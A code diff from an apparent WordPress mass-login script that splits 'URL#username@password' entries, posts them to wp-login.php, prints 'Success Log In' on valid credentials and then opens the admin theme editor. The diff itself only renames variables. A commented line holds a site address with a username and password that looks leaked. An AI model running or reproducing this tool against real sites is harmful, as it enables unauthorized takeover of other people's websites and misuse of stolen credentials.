@@ -40,8 +40,8 @@ def wordpress(ek):
 		web = ek
 	#web = "https://thisismaadi.com//wp-login.php#bpietak@12345678"
 	try:
-		tai = web.split('#')[1]
-		tom = tai.split('@')
+		reks1 = web.split('#')[1]
+		tom = reks1.split('@')
 		username = tom[0]
 		password = tom[1]
 		#print(username+'|'+password)
@@ -55,7 +55,7 @@ def wordpress(ek):
 				'wp-submit':'Log+In'}
 
 		gasken = session.post(web, data=data, headers=headers1, timeout=10)
-		tol = re.findall(r'<title>(.*?)</title>', gasken.text)
+		reks2 = re.findall(r'<title>(.*?)</title>', gasken.text)
 		if 'wp-menu-name' in gasken.text:
 			print('[ + ] Success Log In {}' .format(web))
 			dong = session.get(url+'/wp-admin/theme-editor.php', timeout=15)
@@ -126,7 +126,7 @@ def wordpress(ek):
 			else:
 				#print('{}{} ..... {}NOT VULN' .format(fb,vuln2,fr))
 				print('[ - ] Failed Login {}' .format(web))
-			#print(tol)
+			#print(reks2)
 	except Exception as e:
 		#pass
 		print('{} --> ERROR' .format(web))
